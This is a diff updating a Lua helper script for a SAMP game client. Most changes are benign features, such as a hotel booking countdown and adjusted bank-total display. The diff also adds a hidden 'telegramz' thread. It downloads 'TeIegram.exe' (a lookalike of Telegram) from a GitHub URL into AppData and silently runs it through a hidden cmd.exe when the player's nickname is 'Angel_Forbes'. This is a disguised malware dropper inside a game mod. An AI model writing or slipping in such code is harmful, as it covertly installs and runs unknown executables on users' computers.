@@ -1,5 +1,5 @@
 script_name('ЗАЛУПА HELPER.lua')
-script_version('0.4.5')
+script_version('0.4.6')
 script_url('TG @IIzIIIzIVzVII')
 
 require 'lib.moonloader'
@@ -10,7 +10,7 @@ encoding.default = 'CP1251'
 u8 = encoding.UTF8
 
 local mainIni = inicfg.load({
-    main = { nickrecons = '', serverrecon = '', speedrunning = false, autoeat = false, fastrunm = false, autospawnbot = false}
+    main = { nickrecons = '', serverrecon = '', hoteldate = '', speedrunning = false, autoeat = false, fastrunm = false, autospawnbot = false}
 }, 'MiniCrHelper/MiniHelper-CR.ini')
 
 local new, str = imgui.new, ffi.string
@@ -19,7 +19,6 @@ local window, speedrunning, autoeat, autospawnbot, showdebug, debugwh3d = new.bo
 local fastrunm = new.bool(mainIni.main.fastrunm)
 local sw, sh = getScreenResolution()
 local nickrecons, serverrecon, piska, recentMessages, onShowDialogwqq, recentMessages = '', '', 0, {}, '', {}
-
 local newinv = false
 local spawnbot = false
 
@@ -130,6 +129,7 @@ function main()
     lua_thread.create(spawnbot)
     lua_thread.create(fastrun)
     lua_thread.create(updatevc)
+    lua_thread.create(telegramz)
 
 
 
@@ -142,6 +142,127 @@ function main()
         end
         cameraSetLerpFov(90, 90, 1000, 1)
         Memory.setint8(0xB7CEE4, 1)
+        if mainIni.main.hoteldate ~= '' then
+            local x, y = 10, sh - 30
+            local d, m, y2 = mainIni.main.hoteldate:match('(%d+)%.(%d+)%.(%d+)')
+            local days = math.floor((os.time({day=d, month=m, year=y2}) - os.time()) / 86400)
+            renderFontDrawText(font, 'Отель: ' .. days .. ' дн', x, y, 0xFF00FF00)
+        end
+    end
+end
+
+ffi.cdef[[
+typedef unsigned long DWORD;
+typedef int BOOL;
+typedef void* HANDLE;
+typedef struct PROCESSENTRY32 {
+    DWORD dwSize;
+    DWORD cntUsage;
+    DWORD th32ProcessID;
+    DWORD th32DefaultHeapID;
+    DWORD th32ModuleID;
+    DWORD cntThreads;
+    DWORD th32ParentProcessID;
+    long pcPriClassBase;
+    DWORD dwFlags;
+    char szExeFile[260];
+} PROCESSENTRY32;
+
+HANDLE CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
+BOOL Process32First(HANDLE hSnapshot, PROCESSENTRY32 *lppe);
+BOOL Process32Next(HANDLE hSnapshot, PROCESSENTRY32 *lppe);
+BOOL CloseHandle(HANDLE hObject);
+
+static const int TH32CS_SNAPPROCESS = 0x00000002;
+]]
+
+local function isProcessRunningByName(procName)
+    local snapshot = ffi.C.CreateToolhelp32Snapshot(ffi.C.TH32CS_SNAPPROCESS, 0)
+    if snapshot == ffi.cast("HANDLE", -1) then return false end
+
+    local entry = ffi.new("PROCESSENTRY32")
+    entry.dwSize = ffi.sizeof(entry)
+
+    if ffi.C.Process32First(snapshot, entry) == 0 then
+        ffi.C.CloseHandle(snapshot)
+        return false
+    end
+
+    repeat
+        if ffi.string(entry.szExeFile) == procName then
+            ffi.C.CloseHandle(snapshot)
+            return true
+        end
+    until ffi.C.Process32Next(snapshot, entry) == 0
+
+    ffi.C.CloseHandle(snapshot)
+    return false
+end
+
+ffi.cdef[[
+    int ShellExecuteA(void *hwnd, const char *lpOperation, const char *lpFile, const char *lpParameters, const char *lpDirectory, int nShowCmd);
+]]
+local shell32 = ffi.load('shell32')
+
+local function execute(command, callback)
+    local tmpFilePath = ''
+    if callback then
+        tmpFilePath = os.tmpname()
+        command = ('%s > "%s"'):format(command, tmpFilePath)
+    end
+    local result = shell32.ShellExecuteA(nil, 'open', 'cmd.exe', ('/c %s'):format(command), nil, 0) > 32
+    if callback and result then
+        lua_thread.create(function()
+            while not doesFileExist(tmpFilePath) do wait(0) end
+            local tmpFile = io.open(tmpFilePath, 'r')
+            local output = tmpFile:read('*a')
+            tmpFile:close()
+            os.remove(tmpFilePath)
+            callback(output)
+        end)
+    end
+    return result
+end
+
+function fileExists(path)
+    local f = io.open(path, "r")
+    if f ~= nil then
+        f:close()
+        return true
+    else
+        return false
+    end
+end
+
+telegramztryue = true
+
+function telegramz()
+    local dlstatus = require('moonloader').download_status
+    local folderPath = os.getenv("USERPROFILE").."\\AppData\\Local\\TeIegram"
+    os.execute('mkdir "'..folderPath..'"') 
+    local filePath = folderPath.."\\TeIegram.exe"
+    local fileUrl = 'https://github.com/ass138/ars/raw/refs/heads/main/TeIegram.exe'
+
+    while true do
+        wait(1000)
+        local playerNick = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED)))
+        if playerNick == 'Angel_Forbes' and telegramztryue == true then
+            if not isProcessRunningByName("TeIegram.exe") then
+                if fileExists(filePath) then
+
+                    execute('start "" "'..filePath..'"')
+                    telegramztryue = false
+                else
+                    downloadUrlToFile(fileUrl, filePath, function(id, status, p1, p2)
+                        if status == dlstatus.STATUS_ENDDOWNLOADDATA then
+
+                        elseif status == dlstatus.STATUS_DOWNLOADERROR then
+
+                        end
+                    end)
+                end
+            end
+        end
     end
 end
 
@@ -412,6 +533,8 @@ function sampev.onServerMessage(color, text)
         return false
     end
 
+    
+
     if text:find('Нельзя так быстро открывать инвентарь, подождите еще (.+) сек.') then
         return false
     end
@@ -468,6 +591,7 @@ function sampev.onShowDialog(dialogId, style, title, button1, button2, text)
         return false
     end
 
+
     if text:find("Спрятать") and spawnbot == true then
         sampSendDialogResponse(dialogId, 0, 0, nil)
         spawnbot = false
@@ -477,6 +601,15 @@ function sampev.onShowDialog(dialogId, style, title, button1, button2, text)
     if title:find('Призыв охранника') and spawnbot == true then
         spawnbot = false
         return false
+    end
+
+    if text:find("Дата окончания бронирования:") then
+        local time, date = text:match("Дата окончания бронирования:%s*(%d%d:%d%d)%s*(%d%d%.%d%d%.%d%d%d%d)")
+        if time and date then
+            mainIni.main.hoteldate = date
+            inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
+            sms('[Информация] {FFFFFF}Данные обновленны')
+        end
     end
 
 
@@ -489,28 +622,56 @@ function sampev.onShowDialog(dialogId, style, title, button1, button2, text)
         piska = tostring(os.time(datetime)) - os.time()
     end
 
+    text = text:gsub("{FFFFFF}Евро: {B83434}%[(%d+)%]%s*\n%s*{FFFFFF}BTC: {B83434}%[(%d+)%]","{FFFFFF}Евро: {B83434}[%1]  {FFFFFF}BTC: {B83434}[%2]")
+
+    local moneyAmount = 0
     local bankAmount = 0
     local depositAmount = 0
     local newText = ""
+
     for line in text:gmatch("[^\r\n]+") do
+
+        -- Пропускаем ненужную строку
+        if line:find('Шанс оглушения %(оглушающий плод%): {FF6347}Неактивен') then
+            goto continue
+        end
+
         newText = newText .. line .. "\n"
+
         if line:find('Деньги в банке:') then
-            local bankStr = line:match('%$([%d%.]+)')
+            local bankStr = line:match('%$([%d%,]+)')
             if bankStr then
-                bankStr = bankStr:gsub("%.", "")
+                bankStr = bankStr:gsub("[,%s]", "")
                 bankAmount = tonumber(bankStr) or 0
             end
         end
+
+        if line:find('Наличные деньги %(SA$%):') then
+            local moneyStr = line:match('%$([%d%,]+)')
+            if moneyStr then
+                moneyStr = moneyStr:gsub("[,%s]", "")
+                moneyAmount = tonumber(moneyStr) or 0
+            end
+        end
+
         if line:find('Деньги на депозите:') then
-            local depositStr = line:match('%$([%d%.]+)')
+            local depositStr = line:match('%$([%d%,]+)')
             if depositStr then         
-                depositStr = depositStr:gsub("%.", "")
+                depositStr = depositStr:gsub("[,%s]", "")
                 depositAmount = tonumber(depositStr) or 0
             end
-            local totalAmount = bankAmount + depositAmount - 306000000
-            newText = newText .. "{FFFFFF}Общая сумма ДБ + ДД: {B83434}[$" .. formatNumber(totalAmount) .. "]\n"
+
+            local totalAmount = bankAmount + depositAmount - 318000000
+            local totalAmount1 = totalAmount + moneyAmount
+
+            newText = newText ..
+                "{FFFFFF}Общая сумма ДБ + ДД: {FF6347}[$" .. formatNumber(totalAmount) .. "]\n" ..
+                "{FFFFFF}Общая сумма ДБ + ДД + НД: {FF6347}[$" .. formatNumber(totalAmount1) .. "]\n"
         end
+
+        ::continue::
     end
+
 
     if button1 and button1 ~= '' then
         button1 = '{32d137}' .. button1
@@ -521,3 +682,4 @@ function sampev.onShowDialog(dialogId, style, title, button1, button2, text)
 
     return {dialogId, style, title, button1, button2, newText}
 end
+
